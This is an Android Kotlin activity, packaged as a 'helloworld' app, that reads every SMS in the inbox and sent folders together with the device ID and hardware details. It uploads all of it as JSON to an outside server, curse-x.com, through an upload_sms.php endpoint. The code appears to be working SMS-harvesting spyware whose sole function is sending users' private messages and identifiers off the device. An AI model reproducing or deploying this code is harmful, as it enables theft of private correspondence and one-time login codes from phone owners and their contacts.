package com.example.helloworld

import android.Manifest
import android.annotation.SuppressLint
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.provider.Settings
import android.provider.Telephony
import android.util.Log
import android.widget.Button
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors

// Data class to hold SMS information
data class SmsMessage(
    val address: String,
    val body: String,
    val date: Long, // Add timestamp if needed, requires reading Telephony.Sms.DATE column
    val type: Int   // Add type (Inbox/Sent) if needed, requires reading Telephony.Sms.TYPE column
)

class MainActivity : AppCompatActivity() {

    private val READ_SMS_PERMISSION_CODE = 101
    private val executor = Executors.newSingleThreadExecutor() // Executor for background tasks

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val readSmsButton: Button = findViewById(R.id.readSmsButton)

        readSmsButton.setOnClickListener {
            checkPermissionAndReadSms()
        }
    }

    private fun checkPermissionAndReadSms() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED) {
            // Permission is not granted, request it
            ActivityCompat.requestPermissions(this,
                arrayOf(Manifest.permission.READ_SMS),
                READ_SMS_PERMISSION_CODE)
        } else {
            // Permission has already been granted
            readSmsMessages()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int,
                                            permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            READ_SMS_PERMISSION_CODE -> {
                // If request is cancelled, the result arrays are empty.
                if ((grantResults.isNotEmpty() &&
                            grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
                    // Permission was granted
                    readSmsMessages()
                } else {
                    // Permission denied
                    Toast.makeText(this, "Read SMS permission denied", Toast.LENGTH_SHORT).show()
                }
                return
            }
            // Add other 'when' lines to check for other
            // permissions this app might request.
        }
    }

    @SuppressLint("HardwareIds") // Suppress warning for ANDROID_ID
    private fun readSmsMessages() {
        Log.d("MainActivity", "Read SMS permission granted. Reading messages...")
        Toast.makeText(this, "Reading SMS...", Toast.LENGTH_SHORT).show()

        val smsList = mutableListOf<SmsMessage>()
        // Define projection to get specific columns
        val projection = arrayOf(
            Telephony.Sms.ADDRESS,
            Telephony.Sms.BODY,
            Telephony.Sms.DATE,
            Telephony.Sms.TYPE
        )

        // Query both Inbox and Sent SMS for a more complete log
        val urisToQuery = listOf(Telephony.Sms.Inbox.CONTENT_URI, Telephony.Sms.Sent.CONTENT_URI)
        var messagesReadCount = 0

        urisToQuery.forEach { uri ->
            val cursor: Cursor? = contentResolver.query(
                uri,
                projection,
                null, // Selection: null returns all rows
                null, // Selection args
                Telephony.Sms.DEFAULT_SORT_ORDER // Sort order (usually date descending)
            )

            cursor?.use { // Use ensures the cursor is closed automatically
                if (it.moveToFirst()) {
                    val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
                    val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                    val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
                    val typeIndex = it.getColumnIndex(Telephony.Sms.TYPE)

                    // Check if columns exist before accessing them
                    if (addressIndex != -1 && bodyIndex != -1 && dateIndex != -1 && typeIndex != -1) {
                        do {
                            val address = it.getString(addressIndex) ?: "Unknown Address"
                            val body = it.getString(bodyIndex) ?: "Empty Body"
                            val date = it.getLong(dateIndex)
                            val type = it.getInt(typeIndex)
                            smsList.add(SmsMessage(address, body, date, type))
                            messagesReadCount++
                            // Log only first few messages to avoid flooding logs
                            if (messagesReadCount < 5) {
                                Log.d("MainActivity", "SMS From: $address, Type: $type, Body: $body")
                            }
                        } while (it.moveToNext())
                    } else {
                        Log.e("MainActivity", "Required SMS columns not found in $uri.")
                        // Show toast only once if columns are missing
                        if (messagesReadCount == 0) { // Avoid showing multiple toasts if columns missing in both URIs
                           runOnUiThread { Toast.makeText(this, "Error reading SMS columns", Toast.LENGTH_SHORT).show() }
                        }
                    }
                } else {
                    Log.d("MainActivity", "No SMS messages found in $uri.")
                }
            } ?: run {
                Log.e("MainActivity", "Could not query SMS URI: $uri.")
                 runOnUiThread { Toast.makeText(this, "Error querying SMS", Toast.LENGTH_SHORT).show() }
            }
        } // End forEach URI

        Log.d("MainActivity", "Finished reading $messagesReadCount total messages.")

        if (messagesReadCount > 0) {
             runOnUiThread { Toast.makeText(this, "Read $messagesReadCount SMS messages. Sending to server...", Toast.LENGTH_LONG).show() }

            // Get Device ID and Info
            val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown_device"
            val deviceInfo = mapOf(
                "model" to Build.MODEL,
                "manufacturer" to Build.MANUFACTURER,
                "android_version" to Build.VERSION.RELEASE,
                "sdk_int" to Build.VERSION.SDK_INT
            )

            // Send data to server
            sendSmsToServer(deviceId, deviceInfo, smsList)

        } else if (smsList.isEmpty() && messagesReadCount == 0) { // Only show "No SMS" if truly none were found across both URIs
             runOnUiThread { Toast.makeText(this, "No SMS messages found", Toast.LENGTH_SHORT).show() }
        }
    }

    private fun sendSmsToServer(deviceId: String, deviceInfo: Map<String, Any>, smsList: List<SmsMessage>) {
        executor.execute { // Run network operation on a background thread
            val urlString = "https://curse-x.com/android/api/upload_sms.php"
            var connection: HttpURLConnection? = null
            var success = false
            var responseMessage = "Failed to send SMS"

            try {
                val url = URL(urlString)
                connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                connection.setRequestProperty("Accept", "application/json")
                connection.doOutput = true // Allow sending request body
                connection.doInput = true // Allow receiving response
                connection.connectTimeout = 15000 // 15 seconds
                connection.readTimeout = 15000 // 15 seconds

                // Create JSON payload
                val smsJsonArray = JSONArray()
                smsList.forEach { sms ->
                    val smsJson = JSONObject()
                    smsJson.put("address", sms.address)
                    smsJson.put("body", sms.body)
                    smsJson.put("date", sms.date)
                    smsJson.put("type", sms.type)
                    smsJsonArray.put(smsJson)
                }

                val deviceInfoJson = JSONObject()
                deviceInfo.forEach { (key, value) -> deviceInfoJson.put(key, value) }

                val payload = JSONObject()
                payload.put("device_id", deviceId)
                payload.put("device_info", deviceInfoJson)
                payload.put("sms_logs", smsJsonArray)

                // Write JSON data to the connection output stream
                val outputStreamWriter = OutputStreamWriter(connection.outputStream, "UTF-8")
                outputStreamWriter.write(payload.toString())
                outputStreamWriter.flush()
                outputStreamWriter.close()

                // Check response code
                val responseCode = connection.responseCode
                Log.d("MainActivity", "Server Response Code: $responseCode")

                if (responseCode == HttpURLConnection.HTTP_OK) {
                    // Read response (optional, but good for debugging)
                    val inputStreamReader = InputStreamReader(connection.inputStream, "UTF-8")
                    val bufferedReader = BufferedReader(inputStreamReader)
                    val response = StringBuilder()
                    var line: String?
                    while (bufferedReader.readLine().also { line = it } != null) {
                        response.append(line?.trim())
                    }
                    bufferedReader.close()
                    Log.d("MainActivity", "Server Response: ${response.toString()}")
                    // You could parse the JSON response here if needed
                    success = true
                    responseMessage = "SMS data sent successfully!"

                } else {
                    // Read error stream if available
                    try {
                        val errorStreamReader = InputStreamReader(connection.errorStream, "UTF-8")
                        val errorBufferedReader = BufferedReader(errorStreamReader)
                        val errorResponse = StringBuilder()
                        var errorLine: String?
                        while (errorBufferedReader.readLine().also { errorLine = it } != null) {
                            errorResponse.append(errorLine?.trim())
                        }
                        errorBufferedReader.close()
                        Log.e("MainActivity", "Server Error Response: ${errorResponse.toString()}")
                        responseMessage = "Server error: $responseCode - ${errorResponse.toString()}"
                    } catch (e: Exception) {
                         Log.e("MainActivity", "Error reading error stream: ${e.message}")
                         responseMessage = "Server error: $responseCode"
                    }
                }

            } catch (e: Exception) {
                Log.e("MainActivity", "Error sending SMS data: ${e.message}", e)
                 responseMessage = "Network error: ${e.message}"
            } finally {
                connection?.disconnect()
                // Show result on UI thread
                runOnUiThread {
                    Toast.makeText(this, responseMessage, Toast.LENGTH_LONG).show()
                }
            }
        }
    }
}